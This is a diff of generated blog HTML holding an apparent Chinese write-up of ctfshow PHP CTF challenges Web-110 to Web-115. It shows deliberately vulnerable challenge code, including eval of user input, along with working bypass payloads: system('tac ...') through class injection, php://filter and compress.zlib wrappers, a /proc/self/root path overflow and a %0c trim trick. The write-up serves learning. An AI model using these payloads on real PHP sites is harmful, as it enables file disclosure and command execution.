@@ -907,59 +790,59 @@ if(isset($_GET['v1']) &amp;&amp; isset($_GET['v2'])){
 <p>?v1=Exception&amp;v2=system(‘tac fl36dg.txt’)</p>
 <p>?v1=RefletionClass&amp;v2=system(‘tac fl36dg.txt’)</p>
 </blockquote>
-<h1 id="Web-110-FilesystemIterator类"><a href="#Web-110-FilesystemIterator类" class="headerlink" title="Web-110 FilesystemIterator类"></a>Web-110 FilesystemIterator类</h1><pre class="line-numbers language-php" data-language="php"><code class="language-php">highlight_file(__FILE__);
+<h1 id="Web-110-FilesystemIterator类"><a href="#Web-110-FilesystemIterator类" class="headerlink" title="Web-110 FilesystemIterator类"></a>Web-110 FilesystemIterator类</h1><div class="code-wrapper"><pre class="line-numbers language-php" data-language="php"><code class="language-php">highlight_file(__FILE__);
 error_reporting(0);
-if(isset($_GET['v1']) &amp;&amp; isset($_GET['v2'])){
-    $v1 = $_GET['v1'];
-    $v2 = $_GET['v2'];
+if(isset($_GET[&#39;v1&#39;]) &amp;&amp; isset($_GET[&#39;v2&#39;]))&#123;
+    $v1 &#x3D; $_GET[&#39;v1&#39;];
+    $v2 &#x3D; $_GET[&#39;v2&#39;];
 
-    if(preg_match('/\~|\`|\!|\@|\#|\\$|\%|\^|\&amp;|\*|\(|\)|\_|\-|\+|\=|\{|\[|\;|\:|\"|\'|\,|\.|\?|\\\\|\/|[0-9]/', $v1)){
-            die("error v1");
-    }
-    if(preg_match('/\~|\`|\!|\@|\#|\\$|\%|\^|\&amp;|\*|\(|\)|\_|\-|\+|\=|\{|\[|\;|\:|\"|\'|\,|\.|\?|\\\\|\/|[0-9]/', $v2)){
-            die("error v2");
-    }
-    eval("echo new $v1($v2());");
-}<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+    if(preg_match(&#39;&#x2F;\~|\&#96;|\!|\@|\#|\\$|\%|\^|\&amp;|\*|\(|\)|\_|\-|\+|\&#x3D;|\&#123;|\[|\;|\:|\&quot;|\&#39;|\,|\.|\?|\\\\|\&#x2F;|[0-9]&#x2F;&#39;, $v1))&#123;
+            die(&quot;error v1&quot;);
+    &#125;
+    if(preg_match(&#39;&#x2F;\~|\&#96;|\!|\@|\#|\\$|\%|\^|\&amp;|\*|\(|\)|\_|\-|\+|\&#x3D;|\&#123;|\[|\;|\:|\&quot;|\&#39;|\,|\.|\?|\\\\|\&#x2F;|[0-9]&#x2F;&#39;, $v2))&#123;
+            die(&quot;error v2&quot;);
+    &#125;
+    eval(&quot;echo new $v1($v2());&quot;);
+&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></div>
 
 <p>正则表达式过滤除字母外的所有字符，通过<code>FilesystemIterator</code>内置类绕过读取当前目录下的文件。PHP中的<code>getcwd()</code>可以做到</p>
 <p>payload:<code>?v1=FilesystemIterator&amp;v2=getcwd</code></p>
 <p>读取到当前目录存在<code>fl36dga.txt</code>,浏览器直接访问得到flag。</p>
-<h1 id="Web-111-GLOBALS全局变量"><a href="#Web-111-GLOBALS全局变量" class="headerlink" title="Web-111 GLOBALS全局变量"></a>Web-111 GLOBALS全局变量</h1><pre class="line-numbers language-php" data-language="php"><code class="language-php">include("flag.php");
-function getFlag(&amp;$v1,&amp;$v2){
-    eval("$$v1 = &amp;$$v2;");
+<h1 id="Web-111-GLOBALS全局变量"><a href="#Web-111-GLOBALS全局变量" class="headerlink" title="Web-111 GLOBALS全局变量"></a>Web-111 GLOBALS全局变量</h1><div class="code-wrapper"><pre class="line-numbers language-php" data-language="php"><code class="language-php">include(&quot;flag.php&quot;);
+function getFlag(&amp;$v1,&amp;$v2)&#123;
+    eval(&quot;$$v1 &#x3D; &amp;$$v2;&quot;);
     var_dump($$v1);
-}
+&#125;
 
-if(isset($_GET['v1']) &amp;&amp; isset($_GET['v2'])){
-    $v1 = $_GET['v1'];
-    $v2 = $_GET['v2'];
-    if(preg_match('/\~| |\`|\!|\@|\#|\\$|\%|\^|\&amp;|\*|\(|\)|\_|\-|\+|\=|\{|\[|\;|\:|\"|\'|\,|\.|\?|\\\\|\/|[0-9]|\&lt;|\&gt;/', $v1)){
-            die("error v1");
-    }
-    if(preg_match('/\~| |\`|\!|\@|\#|\\$|\%|\^|\&amp;|\*|\(|\)|\_|\-|\+|\=|\{|\[|\;|\:|\"|\'|\,|\.|\?|\\\\|\/|[0-9]|\&lt;|\&gt;/', $v2)){
-            die("error v2");
-    }
-    if(preg_match('/ctfshow/', $v1)){
+if(isset($_GET[&#39;v1&#39;]) &amp;&amp; isset($_GET[&#39;v2&#39;]))&#123;
+    $v1 &#x3D; $_GET[&#39;v1&#39;];
+    $v2 &#x3D; $_GET[&#39;v2&#39;];
+    if(preg_match(&#39;&#x2F;\~| |\&#96;|\!|\@|\#|\\$|\%|\^|\&amp;|\*|\(|\)|\_|\-|\+|\&#x3D;|\&#123;|\[|\;|\:|\&quot;|\&#39;|\,|\.|\?|\\\\|\&#x2F;|[0-9]|\&lt;|\&gt;&#x2F;&#39;, $v1))&#123;
+            die(&quot;error v1&quot;);
+    &#125;
+    if(preg_match(&#39;&#x2F;\~| |\&#96;|\!|\@|\#|\\$|\%|\^|\&amp;|\*|\(|\)|\_|\-|\+|\&#x3D;|\&#123;|\[|\;|\:|\&quot;|\&#39;|\,|\.|\?|\\\\|\&#x2F;|[0-9]|\&lt;|\&gt;&#x2F;&#39;, $v2))&#123;
+            die(&quot;error v2&quot;);
+    &#125;
+    if(preg_match(&#39;&#x2F;ctfshow&#x2F;&#39;, $v1))&#123;
             getFlag($v1,$v2);
-    }
-}<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+    &#125;
+&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></div>
 
 <p>php变量地址引用。利用全局变量赋值给ctfshow这个变量。</p>
 <p>payload:<code>?v1=ctfshow&amp;v2=GLOBALS</code></p>
-<h1 id="Web-112-is-file绕过-php伪协议"><a href="#Web-112-is-file绕过-php伪协议" class="headerlink" title="Web-112 is_file绕过,php伪协议"></a>Web-112 is_file绕过,php伪协议</h1><pre class="line-numbers language-php" data-language="php"><code class="language-php">function filter($file){
-    if(preg_match('/\.\.\/|http|https|data|input|rot13|base64|string/i',$file)){
-        die("hacker!");
-    }else{
+<h1 id="Web-112-is-file绕过-php伪协议"><a href="#Web-112-is-file绕过-php伪协议" class="headerlink" title="Web-112 is_file绕过,php伪协议"></a>Web-112 is_file绕过,php伪协议</h1><div class="code-wrapper"><pre class="line-numbers language-php" data-language="php"><code class="language-php">function filter($file)&#123;
+    if(preg_match(&#39;&#x2F;\.\.\&#x2F;|http|https|data|input|rot13|base64|string&#x2F;i&#39;,$file))&#123;
+        die(&quot;hacker!&quot;);
+    &#125;else&#123;
         return $file;
-    }
-}
-$file=$_GET['file'];
-if(! is_file($file)){
+    &#125;
+&#125;
+$file&#x3D;$_GET[&#39;file&#39;];
+if(! is_file($file))&#123;
     highlight_file(filter($file));
-}else{
-    echo "hacker!";
-}<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+&#125;else&#123;
+    echo &quot;hacker!&quot;;
+&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></div>
 
 <h2 id="is-file"><a href="#is-file" class="headerlink" title="is_file()"></a>is_file()</h2><p>is_file函数。判断给定文件名是否为一个正常的文件。</p>
 <p>如果文件存在且为正常的文件则返回TRUE，否则返回FALSE。</p>
@@ -967,10 +850,10 @@ if(! is_file($file)){
 <p>因此需要做到高亮显示flag文件但文件必须存在。</p>
 <p>使用PHP伪协议进行绕过</p>
 <h2 id="实验："><a href="#实验：" class="headerlink" title="实验："></a>实验：</h2><p>1.</p>
-<p><img src="https://gitee.com/zku4n/picgo/raw/master/img/image-20211201191106865.png" alt="image-20211201191106865" srcset="data:image/svg+xml,%3Csvg%20xmlns='http://www.w3.org/2000/svg'%20viewBox='0%200%20300%20300'%3E%3C/svg%3E" data-src="https://gitee.com/zku4n/picgo/raw/master/img/image-20211201191106865.png" class="lozad post-image"></p>
+<p><img src="https://gitee.com/zku4n/picgo/raw/master/img/image-20211201191106865.png" srcset="/img/loading.gif" lazyload alt="image-20211201191106865"></p>
 <p>当文件存在当前目录时，返回<code>TRUE</code></p>
 <p>2.</p>
-<p><img src="https://gitee.com/zku4n/picgo/raw/master/img/image-20211201191243482.png" alt="image-20211201191243482" srcset="data:image/svg+xml,%3Csvg%20xmlns='http://www.w3.org/2000/svg'%20viewBox='0%200%20300%20300'%3E%3C/svg%3E" data-src="https://gitee.com/zku4n/picgo/raw/master/img/image-20211201191243482.png" class="lozad post-image"></p>
+<p><img src="https://gitee.com/zku4n/picgo/raw/master/img/image-20211201191243482.png" srcset="/img/loading.gif" lazyload alt="image-20211201191243482"></p>
 <p>当文件存在当前目录，使用PHP伪协议时，返回<code>FALSE</code></p>
 <p>绕过条件</p>
 <p>payload:</p>
@@ -982,19 +865,19 @@ if(! is_file($file)){
 </blockquote>
 <p>关于过滤器php://的参考文档：<a target="_blank" rel="noopener" href="https://www.php.net/manual/zh/wrappers.php.php">https://www.php.net/manual/zh/wrappers.php.php</a></p>
 <p>php://filter/实战技巧：<a target="_blank" rel="noopener" href="https://www.anquanke.com/post/id/202510">https://www.anquanke.com/post/id/202510</a></p>
-<h1 id="Web-113-目录溢出"><a href="#Web-113-目录溢出" class="headerlink" title="Web-113 目录溢出"></a>Web-113 目录溢出</h1><pre class="line-numbers language-php" data-language="php"><code class="language-php">function filter($file){
-    if(preg_match('/filter|\.\.\/|http|https|data|data|rot13|base64|string/i',$file)){
-        die('hacker!');
-    }else{
+<h1 id="Web-113-目录溢出"><a href="#Web-113-目录溢出" class="headerlink" title="Web-113 目录溢出"></a>Web-113 目录溢出</h1><div class="code-wrapper"><pre class="line-numbers language-php" data-language="php"><code class="language-php">function filter($file)&#123;
+    if(preg_match(&#39;&#x2F;filter|\.\.\&#x2F;|http|https|data|data|rot13|base64|string&#x2F;i&#39;,$file))&#123;
+        die(&#39;hacker!&#39;);
+    &#125;else&#123;
         return $file;
-    }
-}
-$file=$_GET['file'];
-if(! is_file($file)){
+    &#125;
+&#125;
+$file&#x3D;$_GET[&#39;file&#39;];
+if(! is_file($file))&#123;
     highlight_file(filter($file));
-}else{
-    echo "hacker!";
-}<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+&#125;else&#123;
+    echo &quot;hacker!&quot;;
+&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></div>
 
 <p>预期解：</p>
 <p><code>?file=/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/var/www/html/flag.php</code></p>
@@ -1004,44 +887,44 @@ if(! is_file($file)){
 <p>非预期解：</p>
 <p>利用没有被过滤的伪协议读文件：</p>
 <p><code>?file=compress.zlib://flag.php</code></p>
-<h1 id="Web-114-filter"><a href="#Web-114-filter" class="headerlink" title="Web-114 filter"></a>Web-114 filter</h1><pre class="line-numbers language-php" data-language="php"><code class="language-php">function filter($file){
-    if(preg_match('/compress|root|zip|convert|\.\.\/|http|https|data|data|rot13|base64|string/i',$file)){
-        die('hacker!');
-    }else{
+<h1 id="Web-114-filter"><a href="#Web-114-filter" class="headerlink" title="Web-114 filter"></a>Web-114 filter</h1><div class="code-wrapper"><pre class="line-numbers language-php" data-language="php"><code class="language-php">function filter($file)&#123;
+    if(preg_match(&#39;&#x2F;compress|root|zip|convert|\.\.\&#x2F;|http|https|data|data|rot13|base64|string&#x2F;i&#39;,$file))&#123;
+        die(&#39;hacker!&#39;);
+    &#125;else&#123;
         return $file;
-    }
-}
-$file=$_GET['file'];
-echo "师傅们居然tql都是非预期 哼！";
-if(! is_file($file)){
+    &#125;
+&#125;
+$file&#x3D;$_GET[&#39;file&#39;];
+echo &quot;师傅们居然tql都是非预期 哼！&quot;;
+if(! is_file($file))&#123;
     highlight_file(filter($file));
-}else{
-    echo "hacker!";
-} 师傅们居然tql都是非预期 哼！<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+&#125;else&#123;
+    echo &quot;hacker!&quot;;
+&#125; 师傅们居然tql都是非预期 哼！<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></div>
 
 <p>过滤中没有php和filter。</p>
 <p>payload:<code>?file=php://filter/resource=flag.php</code></p>
-<h1 id="Web-115-trim绕过"><a href="#Web-115-trim绕过" class="headerlink" title="Web-115 trim绕过"></a>Web-115 trim绕过</h1><pre class="line-numbers language-php" data-language="php"><code class="language-php">include('flag.php');
+<h1 id="Web-115-trim绕过"><a href="#Web-115-trim绕过" class="headerlink" title="Web-115 trim绕过"></a>Web-115 trim绕过</h1><div class="code-wrapper"><pre class="line-numbers language-php" data-language="php"><code class="language-php">include(&#39;flag.php&#39;);
 highlight_file(__FILE__);
 error_reporting(0);
-function filter($num){
-    $num=str_replace("0x","1",$num);
-    $num=str_replace("0","1",$num);
-    $num=str_replace(".","1",$num);
-    $num=str_replace("e","1",$num);
-    $num=str_replace("+","1",$num);
+function filter($num)&#123;
+    $num&#x3D;str_replace(&quot;0x&quot;,&quot;1&quot;,$num);
+    $num&#x3D;str_replace(&quot;0&quot;,&quot;1&quot;,$num);
+    $num&#x3D;str_replace(&quot;.&quot;,&quot;1&quot;,$num);
+    $num&#x3D;str_replace(&quot;e&quot;,&quot;1&quot;,$num);
+    $num&#x3D;str_replace(&quot;+&quot;,&quot;1&quot;,$num);
     return $num;
-}
-$num=$_GET['num'];
-if(is_numeric($num) and $num!=='36' and trim($num)!=='36' and filter($num)=='36'){
-    if($num=='36'){
+&#125;
+$num&#x3D;$_GET[&#39;num&#39;];
+if(is_numeric($num) and $num!&#x3D;&#x3D;&#39;36&#39; and trim($num)!&#x3D;&#x3D;&#39;36&#39; and filter($num)&#x3D;&#x3D;&#39;36&#39;)&#123;
+    if($num&#x3D;&#x3D;&#39;36&#39;)&#123;
         echo $flag;
-    }else{
-        echo "hacker!!";
-    }
-}else{
-    echo "hacker!!!";
-} <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+    &#125;else&#123;
+        echo &quot;hacker!!&quot;;
+    &#125;
+&#125;else&#123;
+    echo &quot;hacker!!!&quot;;
+&#125; <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></div>
 
 <h2 id="trim"><a href="#trim" class="headerlink" title="trim"></a>trim</h2><p>去除字符串首尾处的空白字符（或者其他字符）</p>
 <p>语法：</p>
@@ -1057,425 +940,249 @@ if(is_numeric($num) and $num!=='36' and trim($num)!=='36' and filter($num)=='36'
 <p>“\r”        - 回车</p>
 <p>“ “         - 空格    </p>
 </blockquote>
-<h2 id="测试"><a href="#测试" class="headerlink" title="测试"></a>测试</h2><p><img src="https://gitee.com/zku4n/picgo/raw/master/img/image-20211202105809062.png" alt="image-20211202105809062" srcset="data:image/svg+xml,%3Csvg%20xmlns='http://www.w3.org/2000/svg'%20viewBox='0%200%20300%20300'%3E%3C/svg%3E" data-src="https://gitee.com/zku4n/picgo/raw/master/img/image-20211202105809062.png" class="lozad post-image"></p>
+<h2 id="测试"><a href="#测试" class="headerlink" title="测试"></a>测试</h2><p><img src="https://gitee.com/zku4n/picgo/raw/master/img/image-20211202105809062.png" srcset="/img/loading.gif" lazyload alt="image-20211202105809062"></p>
 <p>输出<code>%09 %0A %0B %0C %0D + %2B - . 0 1 2 3 4 5 6 7 8 9</code></p>
-<p><img src="https://gitee.com/zku4n/picgo/raw/master/img/image-20211202105318433.png" alt="image-20211202105318433" srcset="data:image/svg+xml,%3Csvg%20xmlns='http://www.w3.org/2000/svg'%20viewBox='0%200%20300%20300'%3E%3C/svg%3E" data-src="https://gitee.com/zku4n/picgo/raw/master/img/image-20211202105318433.png" class="lozad post-image"></p>
+<p><img src="https://gitee.com/zku4n/picgo/raw/master/img/image-20211202105318433.png" srcset="/img/loading.gif" lazyload alt="image-20211202105318433"></p>
 <p>输出<code> %0C %2B - . 0 1 2 3 4 5 6 7 8 9</code></p>
 <p>因为<code>%2B</code> <code>-</code> <code>.</code> 被过滤</p>
 <p>在数字前加空格也会被is_numeric识别为数字，trim过滤空格不会过滤<code>\f</code>(%0c)</p>
 <p>payload:<code>?num=%0c36</code></p>
 
-  </div>
-  <div>
-    
-      <div 
-        class="post-note note-warning copyright" 
-        style="margin-top: 42px">
-        <p>
-          <span style="font-weight: bold;">作者：</span><a 
-            target="_blank" 
-            rel="nofollow noopener noreferrer" 
-            href="/about">
-            0x95cn_zkuan
-          </a>
-        </p>
-        <p>
-          <span style="font-weight: bold;">文章链接：</span><a 
-            target="_blank" 
-            rel="nofollow noopener noreferrer" 
-            href="https://whoiszkuan.github.io/2021/12/02/PHP-Security-Features/">
-            https://whoiszkuan.github.io/2021/12/02/PHP-Security-Features/
-          </a>
-        </p>
-        <p><span style="font-weight: bold;">版权声明：</span>本博客所有文章除特别声明外，均采用<a target="_blank" rel="noopener" href="https://creativecommons.org/licenses/by-nc-sa/4.0/deed.zh">CC BY-NC-SA 4.0 协议</a>。转载请注明出处！</p>
-      </div>
-    
-  </div>
-</article>
-<div class="nav">
-  
-    <div class="nav-item-prev">
-      <a 
-        href="/2021/12/09/Directory-Traversal/" 
-        class="nav-link">
-        <i class="iconfont icon-left nav-prev-icon"></i>
-        <div>
-          <div class="nav-label">Prev</div>
-          
-            <div class="nav-title">Directory Traversal </div>
-          
-        </div>
-      </a>
-    </div>
-  
-  
-    <div class="nav-item-next">
-      <a 
-        href="/2021/11/04/Linux-Security/" 
-        class="nav-link">
-        <div>
-          <div class="nav-label">Next</div>
-          
-            <div class="nav-title">Linux-Security </div>
-          
-        </div>
-        <i class="iconfont icon-right nav-next-icon"></i>
-      </a>
-    </div>
-  
-</div>
-
-<div 
-  class="card card-content toc-card" 
-  id="mobiletoc">
-  <div class="toc-header">
-  <i 
-    class="iconfont icon-menu" 
-    style="padding-right: 2px;">
-  </i>TOC
-</div>
-<ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#Web-89-%E6%95%B0%E7%BB%84%E7%BB%95%E8%BF%87"><span class="toc-text">Web-89 数组绕过</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#Web-90-intval"><span class="toc-text">Web-90 intval</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#intval%E5%87%BD%E6%95%B0%E8%AF%B4%E6%98%8E"><span class="toc-text">intval函数说明</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#Web-91-0a%E7%BB%95%E8%BF%87"><span class="toc-text">Web-91 %0a绕过</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#Web-92-intval-%E5%85%AB%E8%BF%9B%E5%88%B6%E5%8D%81%E5%85%AD%E8%BF%9B%E5%88%B6%E7%BB%95%E8%BF%87"><span class="toc-text">Web-92 intval 八进制十六进制绕过</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#Web-93-intval-%E5%85%AB%E8%BF%9B%E5%88%B6%E7%BB%95%E8%BF%87"><span class="toc-text">Web-93 intval 八进制绕过</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#Web-94-intval-%E5%B0%8F%E6%95%B0%E7%82%B9%E7%BB%95%E8%BF%87"><span class="toc-text">Web-94 intval 小数点绕过</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#Web-95-intval-%E7%A9%BA%E6%A0%BC%E7%BB%95%E8%BF%87"><span class="toc-text">Web-95 intval 空格绕过</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#Web-96-%E7%BB%9D%E5%AF%B9%E8%B7%AF%E5%BE%84%EF%BC%8C%E7%9B%B8%E5%AF%B9%E8%B7%AF%E5%BE%84"><span class="toc-text">Web-96 绝对路径，相对路径</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#Web-97-md5%E5%BC%BA%E6%AF%94%E8%BE%83"><span class="toc-text">Web-97 md5强比较</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#Web-98-%E4%B8%89%E5%85%83%E8%BF%90%E7%AE%97"><span class="toc-text">Web-98 三元运算</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#Web-99-in-array%E7%BB%95%E8%BF%87"><span class="toc-text">Web-99 in_array绕过</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#in-array"><span class="toc-text">in_array</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#Web-100-%E5%8F%8D%E5%B0%84%E7%B1%BB%E5%8F%8A%E8%BF%90%E7%AE%97%E7%AC%A6%E4%BC%98%E5%85%88%E7%BA%A7"><span class="toc-text">Web-100 反射类及运算符优先级</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#Web-101-%E5%8F%8D%E5%B0%84%E7%B1%BB"><span class="toc-text">Web-101 反射类</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#Web-102-103-hex2bin"><span class="toc-text">Web-102,103 hex2bin</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#hex2bin"><span class="toc-text">hex2bin</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#is-numeric"><span class="toc-text">is_numeric</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#call-user-func"><span class="toc-text">call_user_func</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#file-put-contents"><span class="toc-text">file_put_contents</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%9E%84%E9%80%A0"><span class="toc-text">构造</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#Web-104-sha1%E5%BC%B1%E7%AD%89%E4%BA%8E"><span class="toc-text">Web-104 sha1弱等于</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#Web-105-%E8%A6%86%E7%9B%96"><span class="toc-text">Web-105 $$覆盖</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#Web-106-sha1%E5%BC%B1%E6%AF%94%E8%BE%83"><span class="toc-text">Web-106 sha1弱比较</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#Web-107-md5%E5%BC%B1%E6%AF%94%E8%BE%83"><span class="toc-text">Web-107 md5弱比较</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#parse-str%E5%87%BD%E6%95%B0"><span class="toc-text">parse_str函数</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#Web-108-ereg-00%E6%88%AA%E6%96%AD"><span class="toc-text">Web-108 ereg %00截断</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#ereg"><span class="toc-text">ereg</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#strrev"><span class="toc-text">strrev</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#intval"><span class="toc-text">intval</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#Web-109-%E5%8F%8D%E5%B0%84%E7%B1%BB%EF%BC%8C%E5%BC%82%E5%B8%B8%E7%B1%BB"><span class="toc-text">Web-109 反射类，异常类</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#Web-110-FilesystemIterator%E7%B1%BB"><span class="toc-text">Web-110 FilesystemIterator类</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#Web-111-GLOBALS%E5%85%A8%E5%B1%80%E5%8F%98%E9%87%8F"><span class="toc-text">Web-111 GLOBALS全局变量</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#Web-112-is-file%E7%BB%95%E8%BF%87-php%E4%BC%AA%E5%8D%8F%E8%AE%AE"><span class="toc-text">Web-112 is_file绕过,php伪协议</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#is-file"><span class="toc-text">is_file()</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%AE%9E%E9%AA%8C%EF%BC%9A"><span class="toc-text">实验：</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#Web-113-%E7%9B%AE%E5%BD%95%E6%BA%A2%E5%87%BA"><span class="toc-text">Web-113 目录溢出</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#Web-114-filter"><span class="toc-text">Web-114 filter</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#Web-115-trim%E7%BB%95%E8%BF%87"><span class="toc-text">Web-115 trim绕过</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#trim"><span class="toc-text">trim</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%B5%8B%E8%AF%95"><span class="toc-text">测试</span></a></li></ol></li></ol>
-</div></main>
-            <aside class="left-column">
-              
-              <div class="card card-author">
+            </div>
+            <hr>
+            <div>
+              <div class="post-metas mb-3">
                 
-  <img 
-    src="/images/zkuan.png" 
-    class="author-img"
-    width="88"
-    height="88"
-    alt="author avatar">
-
-<p class="author-name">0x95cn_zkuan</p>
-<p class="author-description">Kali Linux Lover</p>
-<div class="author-message">
-  <a 
-    class="author-posts-count" 
-    href="/archives">
-    <span>9</span>
-    <span>Posts</span>
-  </a>
-  <a 
-    class="author-categories-count" 
-    href="/categories">
-    <span>4</span>
-    <span>Categories</span>
-  </a>
-  <a 
-    class="author-tags-count" 
-    href="/tags">
-    <span>5</span>
-    <span>Tags</span>
-  </a>
-</div>
-
+                  <div class="post-meta mr-3">
+                    <i class="iconfont icon-category"></i>
+                    
+                      <a class="hover-with-bg" href="/categories/WebSec/">WebSec</a>
+                    
+                  </div>
+                
+                
+                  <div class="post-meta">
+                    <i class="iconfont icon-tags"></i>
+                    
+                      <a class="hover-with-bg" href="/tags/Web/">Web</a>
+                    
+                      <a class="hover-with-bg" href="/tags/Security/">Security</a>
+                    
+                      <a class="hover-with-bg" href="/tags/PHP/">PHP</a>
+                    
+                  </div>
+                
               </div>
-               <div class="sticky-tablet">
-  
-  
-    <article class="display-when-two-columns spacer">
-      <div class="card card-content toc-card">
-        <div class="toc-header">
-  <i 
-    class="iconfont icon-menu" 
-    style="padding-right: 2px;">
-  </i>TOC
-</div>
-<ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#Web-89-%E6%95%B0%E7%BB%84%E7%BB%95%E8%BF%87"><span class="toc-text">Web-89 数组绕过</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#Web-90-intval"><span class="toc-text">Web-90 intval</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#intval%E5%87%BD%E6%95%B0%E8%AF%B4%E6%98%8E"><span class="toc-text">intval函数说明</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#Web-91-0a%E7%BB%95%E8%BF%87"><span class="toc-text">Web-91 %0a绕过</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#Web-92-intval-%E5%85%AB%E8%BF%9B%E5%88%B6%E5%8D%81%E5%85%AD%E8%BF%9B%E5%88%B6%E7%BB%95%E8%BF%87"><span class="toc-text">Web-92 intval 八进制十六进制绕过</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#Web-93-intval-%E5%85%AB%E8%BF%9B%E5%88%B6%E7%BB%95%E8%BF%87"><span class="toc-text">Web-93 intval 八进制绕过</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#Web-94-intval-%E5%B0%8F%E6%95%B0%E7%82%B9%E7%BB%95%E8%BF%87"><span class="toc-text">Web-94 intval 小数点绕过</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#Web-95-intval-%E7%A9%BA%E6%A0%BC%E7%BB%95%E8%BF%87"><span class="toc-text">Web-95 intval 空格绕过</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#Web-96-%E7%BB%9D%E5%AF%B9%E8%B7%AF%E5%BE%84%EF%BC%8C%E7%9B%B8%E5%AF%B9%E8%B7%AF%E5%BE%84"><span class="toc-text">Web-96 绝对路径，相对路径</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#Web-97-md5%E5%BC%BA%E6%AF%94%E8%BE%83"><span 